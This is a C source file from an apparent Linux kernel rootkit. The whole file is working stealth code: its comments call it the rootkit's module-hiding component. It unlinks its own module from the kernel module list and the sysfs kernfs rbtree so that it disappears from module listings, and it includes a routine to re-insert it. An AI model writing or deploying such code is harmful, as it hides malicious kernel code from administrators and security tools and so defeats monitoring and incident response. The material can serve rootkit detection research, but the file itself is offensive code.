/**
 * hide_module.c
 *
 * Hide and unhide linux kernel modules by removing them from the corresponding data structures.
 */

#include "hook.h"
#include <linux/kernfs.h>
#include <linux/hash.h>
#include <linux/rbtree.h>


/************ DEFINITIONS *********/
struct module_node {
	struct module *mod;
	struct list_head *mod_next;
};

/****************** PROTOTYPES *************/
void hide_module(struct module *mod);
void unhide_module(struct module *mod, struct list_head *head);
void rb_add(struct kernfs_node *node);



/******** DATA ***********/
/* backup pointers to previous element of list entry for modules */
static struct list_head *mod_prev;
static bool hidden = false;

/*
 * Hides the rootkit module
 */
void initialize_hiding_module(void){
	if(hidden){
		return;
	}
	hide_module(THIS_MODULE);
	hidden = true;
	return;
}

/*
 * Unhides the rootkit module
 */
void remove_hiding_module(void){
	if(!hidden){
		return;
	}
	unhide_module(THIS_MODULE, mod_prev);
	hidden = false;
	return;
}


void hide_module(struct module *mod)
{
	struct kernfs_node *node = mod->mkobj.kobj.sd;

	/* backup previous entry of module list */
	mod_prev = mod->list.prev;

	/* remove module from module list */
	list_del(&mod->list);

	/* remove module from rbtree */
	rb_erase(&node->rb, &node->parent->dir.children);
	node->rb.__rb_parent_color = (unsigned long)(&node->rb);
}

void unhide_module(struct module *mod, struct list_head *head)
{
	list_add(&mod->list, head);

	/* add module back in rbtree */
	rb_add(mod->mkobj.kobj.sd);
}

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, 
	const void *ns)
{
	/* compare hash value */
	if(hash != kn->hash)
		return hash - kn->hash;

	/* compare ns */
	if(ns != kn->ns)
		return ns - kn->ns;

	/* compare name */
	return strcmp(name, kn->name);
}

void rb_add(struct kernfs_node *node)
{
	struct rb_node **child = &node->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;

	while(*child) {
		struct kernfs_node *pos;
		int result;

		/* cast rb_node to kernfs_node */
		pos = rb_entry(*child, struct kernfs_node, rb);

		/* 
		 * traverse the rbtree from root to leaf (until correct place found)
		 * next level down, child from previous level is now the parent
		 */
		parent = *child;

		/* using result to determine where to put the node */
		result = nodecmp(pos, node->hash, node->name, node->ns);

		if(result < 0)
			child = &pos->rb.rb_left;
		else if(result > 0)
			child = &pos->rb.rb_right;
		else
			return;
	}
	
	/* add new node and reblance the tree */
	rb_link_node(&node->rb,parent, child);
	rb_insert_color(&node->rb, &node->parent->dir.children);
	
	/* needed for special cases */
	if (kernfs_type(node) == KERNFS_DIR)
		node->parent->dir.subdirs++;
}
